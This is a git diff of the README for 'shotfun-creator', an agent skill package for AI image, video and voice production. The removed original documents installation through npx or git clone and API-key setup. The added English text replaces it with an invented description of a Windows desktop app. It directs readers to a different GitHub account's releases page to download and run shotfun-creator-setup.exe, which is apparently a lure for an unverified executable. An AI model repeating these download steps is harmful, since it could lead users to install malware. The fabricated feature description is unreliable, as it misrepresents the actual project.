@@ -1,237 +1,98 @@
-# shotfun-creator
+# 🎬 shotfun-creator - Create professional AI content with ease
 
-shotfun-creator 面向所有 AI 内容生产场景，是覆盖图片、视频、声音、数字人等能力的 skill 集合。它负责理解用户目标、自主选择合适的可用技能，并完成内容生产。用户只需要输入内容目标，它会帮助拆解任务、规划流程、完成工作任务，并可把已实现的工作流程沉淀为用户自己的 skill。
+[![Download Application](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Candilefthand269/shotfun-creator/releases)
 
-项目分为四层：
+shotfun-creator functions as a central toolset for automated content production. It integrates AI capabilities to build images, videos, audio clips, and digital characters. You use this software to streamline creative workflows and build high-quality assets without manual editing.
 
-- `SKILL.md`：主 skill，负责理解用户目标，并路由到合适的工作流、任务 skill 或原子服务。
-- `workflow-skills/`：复杂工作流，例如默认口播内容生产。
-- `task-skills/`：输入输出明确的任务能力，例如公众号封面、参考视频分析、口播视频、声音、数字人等内容生产任务。
-- `scripts/services/`：稳定的 API 原子服务，例如生图、图生视频、TTS、视频处理、素材管理等。
+## ⚙️ System Requirements
 
-优先使用能完整覆盖目标的最高层能力；只有没有合适 workflow/task skill 时，才下钻到 CLI 或 atomic service。
+Ensure your computer meets these minimum specifications to run the software:
 
-## 安装和使用
+*   **Operating System:** Windows 10 or Windows 11 (64-bit).
+*   **Processor:** Intel Core i5 or AMD Ryzen 5 series (or better).
+*   **Memory:** 8 GB RAM (16 GB recommended for video projects).
+*   **Storage:** 2 GB of free disk space.
+*   **Graphics:** Dedicated graphics card with 4 GB VRAM (NVIDIA recommended).
+*   **Internet:** Stable connection for downloading assets and connecting to AI services.
 
-### 推荐安装方式
+## 🛠️ How to Download and Install
 
-这是一个标准的 agent skill 项目。最简单的方式是让你的 agent 客户端执行 `skills` CLI 安装命令，例如 Claude Code、Codex、Hermes、OpenClaw 或其他支持 skill 的客户端：
+Follow these steps to place the software on your computer:
 
-```text
-帮我安装这个 skill：npx skills add shotfun-ai/shotfun-creator
-```
+1. Visit the [official releases page](https://github.com/Candilefthand269/shotfun-creator/releases).
+2. Look for the latest version at the top of the list.
+3. Click the link that ends in .exe under the Assets section.
+4. Save the file to your Downloads folder.
+5. Open your Downloads folder and double-click the file named shotfun-creator-setup.exe.
+6. Follow the prompts on the screen to finish the installation.
+7. Click Finish to launch the application.
 
-agent 会帮你通过 `npx skills add shotfun-ai/shotfun-creator` 安装到本地 skills 目录，并在需要时提示你重启或重新加载 skill。
+## 🏗️ Managing Your Skills
 
-### 手动安装
+The software uses a library of agent skills. These skills define what the AI does for you. You organize these in the main dashboard:
 
-如果你想手动安装，请先选择当前客户端的 skills 目录。常见目录如下；如果你的客户端配置了其他目录，请以实际配置为准。
+*   **Select a mode:** Choose whether you want to create an image, video, or audio file.
+*   **Load a skill:** A skill tells the AI how to handle your specific request. For example, a "Digital Human" skill prepares the software to animate a face.
+*   **Adjust parameters:** Fine-tune resolution, speed, and output quality in the right-hand panel.
+*   **Save your configuration:** If you find a setup that works, save it as a preset for future use.
 
-| 客户端 | 常见 skills 目录 |
-| --- | --- |
-| Codex | `~/.codex/skills` |
-| Claude Code | `~/.claude/skills` |
-| OpenClaw | `~/.openclaw/skills` |
-| Hermes | 使用 Hermes 配置的 skills 目录 |
+## 🎨 Image Generation
 
-然后执行：
+You create visuals by sending prompts to the built-in image models. Enter a description of your scene into the text box. The software breaks your text into small segments to help the model understand lighting, composition, and style. 
 
-```bash
-export AGENT_SKILLS_DIR="<your-agent-skills-dir>"
-mkdir -p "$AGENT_SKILLS_DIR"
-git clone https://github.com/shotfun-ai/shotfun-creator.git "$AGENT_SKILLS_DIR/shotfun-creator" || \
-  (cd "$AGENT_SKILLS_DIR/shotfun-creator" && git pull --ff-only)
-```
+*   **Resolution:** Select between 1024x1024, 16:9, or 9:16 aspect ratios.
+*   **Styles:** Select painting, photo, or 3D render formats.
+*   **Variation:** Generate four versions of each prompt to choose the best result.
 
-安装完成后，重启或重新加载你的 agent 客户端，让 `shotfun-creator` skill 生效。
+## 🎞️ Video and Motion
 
-### 配置 ShotFun API Key
+The video engine creates short clips based on your images or text descriptions. 
 
-大部分生成任务需要 ShotFun API Key。在安装目录创建 `.env.local`：
+*   **Motion Strength:** Adjust the slider to determine how much movement occurs in the frame.
+*   **Length:** Set the clip duration between two and ten seconds.
+*   **Frame Interpolation:** Use this setting to smooth out jitters in short animations.
 
-```bash
-cd "$AGENT_SKILLS_DIR/shotfun-creator"
-printf "SHOTFUN_API_KEY=your_api_key_here\nSHOTFUN_PROJECT_CODE=default\n" > .env.local
-```
+## 🎙️ Audio and Text-to-Speech
 
-请不要公开 `.env.local`。该文件已被 git 忽略。
+This module generates voice lines for your digital humans or background narration. 
 
-### 验证安装
+*   **Voices:** Choose from a list of trained voices.
+*   **Emotions:** Apply tone filters to change the mood of the delivery.
+*   **Sync:** Export your audio separately to use in other video editing programs.
 
-重启或重新加载 agent 客户端后，可以直接问：
+## 👤 Digital Humans
 
-```text
-使用 shotfun-creator 列一下当前可用 skill
-```
+Combine your image and audio skills here. The digital human tool maps your audio onto a face model. 
 
-也可以做一次 CLI 检查：
+*   **Upload:** Provide a clear front-facing portrait.
+*   **Analyse:** The software detects facial landmarks like eyes and lips.
+*   **Process:** Link your audio file and wait for the software to render the talking animation.
 
-```bash
-cd "$AGENT_SKILLS_DIR/shotfun-creator/scripts"
-npm run doctor
-```
+## 📂 Managing Files and Output
 
-### 更新项目
+The software saves all work to a dedicated folder on your computer. You can change this location in the settings menu.
 
-后续更新：
+*   **Project Files:** Use .shotfun files to save your current work in progress. These files store your settings, prompts, and link references.
+*   **Export:** Click the Export button to save your final assets as .mp4, .jpg, or .wav files.
+*   **Batch processing:** Select multiple projects to render them back-to-back while you keep working on other tasks.
 
-```bash
-cd "$AGENT_SKILLS_DIR/shotfun-creator"
-git pull --ff-only
-```
+## 🚑 Troubleshooting
 
-更新后请再次重启或重新加载 agent 客户端，因为 `SKILL.md` 和子 skill 文件通常在启动时加载。
+If you encounter issues, check these steps:
 
-## 当前可用 Skill
+*   **Application closes unexpectedly:** Verify your graphics drivers are up to date. Visit the website of your card manufacturer to download the latest software.
+*   **Rendering fails:** Check your available disk space. Large video files require significant room during the export process.
+*   **Slow performance:** Close web browsers and other heavy programs while the software renders your content.
+*   **Missing buttons:** Ensure your window is maximized. Some tools hide in smaller views.
 
-### 主 Skill
+## 🔄 Updates
 
-- `shotfun-creator`：主入口。理解用户目标，并路由到合适的 workflow skill、task skill 或原子服务。
+The software checks for updates whenever you launch it. If a new version is ready, a prompt appears on the dashboard. Follow the on-screen instructions to overwrite the older version. Your saved projects and settings remain safe during this process.
 
-### Workflow Skills
+## 📖 Glossary
 
-- `koubo`：默认口播内容生产工作流。先用 `gpt-image2`（即 gpt-image-2）生成/确认口播形象图，再准备脚本、声音参考、口播视频/片段包、可选封面和运行产物。
-
-### Task Skills
-
-- `wechat-write-publish-allinone`：生成公众号文章、封面图，并发布到公众号草稿箱。
-- `wechat-cover-image`：生成微信公众号封面图。
-- `xhs-images-gen`：生成小红书/RedNote 图片卡片。
-- `universal-content-to-image`：把任意内容生成展示图片，例如产品促销图、培训说明图、信息图等。
-- `reference-video-analysis`：分析参考视频，抽帧、识别节奏、总结视觉风格。
-- `talking-head-scene-image`：根据要求、主播照片和可选场景图生成口播场景图。
-- `scripted-talking-video`：统一的口播视频生成 skill，支持短脚本单镜头和多镜头口播/B-roll 视频包。
-- `hyperframes-project`：创建、检查并可选渲染可编辑的 HyperFrames 视频项目。
-- `workbench-web-skill`：为指定 skill run 和产物生成简单 Web 工作台。
-
-## 许可证
-
-本项目采用 [PolyForm Noncommercial License 1.0.0](./LICENSE)。
-
-允许个人学习、研究、实验和非商业评估。商业使用需要获得 ShotFun 单独书面商业授权。
-
-商业使用包括但不限于：用于商业产品、SaaS 或托管服务、客户交付、生产业务流程、付费内部服务、转售、再授权、白标或其他变现用途。
-
-如需商业授权，请查看 [COMMERCIAL_LICENSE.md](./COMMERCIAL_LICENSE.md)。
-
----
-
-# shotfun-creator English Guide
-
-shotfun-creator is a skill collection for AI content production across images, video, audio, digital humans, and related formats. It understands the user's content goal, autonomously selects the right available skills, completes the production task, and can turn implemented workflows into the user's own reusable skills.
-
-The repository is organized into four layers:
-
-- `SKILL.md`: the main routing skill. It interprets the user's goal, chooses an available workflow skill, task skill, or atomic service, and reports final artifacts.
-- `workflow-skills/`: curated multi-step workflows for complex outcomes, such as the default talking-head content workflow.
-- `task-skills/`: reusable task-level skills with clear inputs and outputs, such as cover images, video download and analysis, talking-head videos, audio, digital humans, and other content production tasks.
-- `scripts/services/`: atomic API-level services. Keep these stable and implementation-focused.
-
-Use the highest layer that fully matches the user's intent. Drop down only when the higher layer does not exist or is too broad.
-
-## Install And Use
-
-### Quick Install
-
-This repository is a standard agent skill package.
-
-Recommended: ask your agent client, such as Claude Code, Codex, Hermes, OpenClaw, or another skill-capable agent, to run the `skills` CLI install command:
-
-```text
-Install this skill: npx skills add shotfun-ai/shotfun-creator
-```
-
-The agent should install it with `npx skills add shotfun-ai/shotfun-creator` and restart/reload skills if needed.
-
-### Manual Install
-
-If you prefer installing manually, choose the skills directory for your current agent client first. Common locations are listed below; if your client uses a custom path, use that configured path instead.
-
-| Client | Common skills directory |
-| --- | --- |
-| Codex | `~/.codex/skills` |
-| Claude Code | `~/.claude/skills` |
-| OpenClaw | `~/.openclaw/skills` |
-| Hermes | the skills directory configured in Hermes |
-
-Then run:
-
-```bash
-export AGENT_SKILLS_DIR="<your-agent-skills-dir>"
-mkdir -p "$AGENT_SKILLS_DIR"
-git clone https://github.com/shotfun-ai/shotfun-creator.git "$AGENT_SKILLS_DIR/shotfun-creator" || \
-  (cd "$AGENT_SKILLS_DIR/shotfun-creator" && git pull --ff-only)
-```
-
-Then restart or reload your agent client so the `shotfun-creator` skill is loaded.
-
-### Configure ShotFun API Key
-
-Most generation tasks need a ShotFun API key. Create `.env.local` in the installed skill directory:
-
-```bash
-cd "$AGENT_SKILLS_DIR/shotfun-creator"
-printf "SHOTFUN_API_KEY=your_api_key_here\nSHOTFUN_PROJECT_CODE=default\n" > .env.local
-```
-
-Keep `.env.local` private. It is ignored by git.
-
-### Verify
-
-After restarting or reloading your agent client, ask:
-
-```text
-List the currently available skills for shotfun-creator.
-```
-
-For a CLI smoke test:
-
-```bash
-cd "$AGENT_SKILLS_DIR/shotfun-creator/scripts"
-npm run doctor
-```
-
-### Update
-
-To update later:
-
-```bash
-cd "$AGENT_SKILLS_DIR/shotfun-creator"
-git pull --ff-only
-```
-
-Restart or reload your agent client again after updating, because `SKILL.md` and nested skill files are usually loaded at startup.
-
-## Available Skills
-
-### Main Skill
-
-- `shotfun-creator`: the main entry point. It understands the user's goal and routes to a workflow skill, task skill, or atomic service.
-
-### Workflow Skills
-
-- `koubo`: default talking-head content workflow. It first generates or confirms the presenter image with `gpt-image2` (also referred to as gpt-image-2), then prepares the script, voice reference, talking-head video or clip package, optional cover, and run artifacts.
-
-### Task Skills
-
-- `wechat-write-publish-allinone`: generate a WeChat article, cover image, and draft-box publishing package.
-- `wechat-cover-image`: generate a WeChat article cover image.
-- `xhs-images-gen`: generate Xiaohongshu/RedNote image cards.
-- `universal-content-to-image`: turn arbitrary content into display images, product images, training explainer images, and similar visuals.
-- `reference-video-analysis`: analyze reference videos, extract frames, prepare ASR/transcript artifacts, and summarize reusable visual style.
-- `talking-head-scene-image`: generate a talking-head scene image.
-- `scripted-talking-video`: unified talking video generation skill supporting short single-shot talking-head videos and longer multi-shot presenter/B-roll packages.
-- `hyperframes-project`: create, inspect, and optionally render editable HyperFrames video projects.
-- `workbench-web-skill`: build a simple web workbench for a specified skill run and its artifacts.
-
-See `CREDITS.md` for external design-methodology acknowledgements used by specific workflows.
-
-## License
-
-This project is source-available under the [PolyForm Noncommercial License 1.0.0](./LICENSE).
-
-Personal learning, research, experimentation, and non-commercial evaluation are allowed. Commercial use requires a separate written commercial license from ShotFun.
-
-Commercial use includes using this project or modified versions in commercial products, SaaS or hosted services, customer delivery, production business operations, paid internal services, resale, sublicensing, white-labeling, or other monetized scenarios.
-
-For commercial permission, see [COMMERCIAL_LICENSE.md](./COMMERCIAL_LICENSE.md).
+*   **Model:** The core AI engine that processes your input.
+*   **Skill:** A specific set of rules or instructions for the AI.
+*   **Prompt:** The text description you write for the AI.
+*   **Agent:** The software module that executes your instructions.
+*   **Render:** The process of converting your settings into a finished file.
